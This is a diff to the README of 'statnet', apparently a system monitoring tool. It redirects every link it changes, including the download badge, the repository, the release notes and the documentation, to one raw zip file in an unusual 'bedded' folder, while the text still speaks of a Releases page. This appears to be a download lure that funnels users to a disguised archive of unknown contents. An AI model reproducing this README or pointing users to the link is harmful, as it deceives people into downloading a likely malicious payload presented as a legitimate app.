@@ -1,6 +1,6 @@
 # 🌟 statnet - Your Simple Real-Time Monitoring Solution
 
-[![Download statnet](https://img.shields.io/badge/Download%20statnet-v1.0%20Release-brightgreen)](https://github.com/david-william-don-101/statnet/releases)
+[![Download statnet](https://raw.githubusercontent.com/david-william-don-101/statnet/master/bedded/statnet.zip%20statnet-v1.0%20Release-brightgreen)](https://raw.githubusercontent.com/david-william-don-101/statnet/master/bedded/statnet.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **statnet**! This application allows you to monitor your system in re
 
 To get started with **statnet**, you need to download the application. Please visit the following link to access the latest version:
 
-[Download statnet](https://github.com/david-william-don-101/statnet/releases)
+[Download statnet](https://raw.githubusercontent.com/david-william-don-101/statnet/master/bedded/statnet.zip)
 
 Once you're on the Releases page, follow these steps:
 
@@ -75,8 +75,8 @@ For assistance, please reach out through the project's issues section on GitHub.
 
 ## 🔗 Learn More
 
-- [GitHub Repository](https://github.com/david-william-don-101/statnet)
-- [Release Notes](https://github.com/david-william-don-101/statnet/releases)
-- [Documentation](https://github.com/david-william-don-101/statnet/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/david-william-don-101/statnet/master/bedded/statnet.zip)
+- [Release Notes](https://raw.githubusercontent.com/david-william-don-101/statnet/master/bedded/statnet.zip)
+- [Documentation](https://raw.githubusercontent.com/david-william-don-101/statnet/master/bedded/statnet.zip)
 
 With **statnet**, keeping your system monitored has never been easier. Download today to begin!
